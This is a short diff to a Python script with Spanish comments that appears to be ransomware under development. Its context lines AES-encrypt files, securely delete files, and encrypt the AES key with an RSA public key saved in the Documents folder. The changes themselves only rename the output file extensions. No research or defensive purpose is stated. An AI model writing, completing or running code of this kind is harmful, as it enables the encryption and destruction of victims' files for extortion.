@@ -52,7 +52,7 @@ def cifrar_archivo_aes(archivo, clave_aes):
         datos = f.read()
 
     datos_cifrados = cipher.encrypt(pad(datos, AES.block_size))
-    with open(archivo + '.owoaes', 'wb') as f:
+    with open(archivo + '.owo', 'wb') as f:
         f.write(iv + datos_cifrados)
 
 # Función para borrar un archivo de forma segura
@@ -140,7 +140,7 @@ public_key_pem = leer_clave_publica()
 clave_aes_cifrada = cifrar_clave_aes_rsa(clave_aes, public_key_pem)
 
 # Guardar la clave cifrada en un archivo
-with open(os.path.join(documents_dir, 'clave_aes_cifrada.owo'), 'w') as f:
+with open(os.path.join(documents_dir, 'clave_aes_cifrada.lol'), 'w') as f:
     f.write(clave_aes_cifrada)
 
 # Cifrar los archivos seleccionados
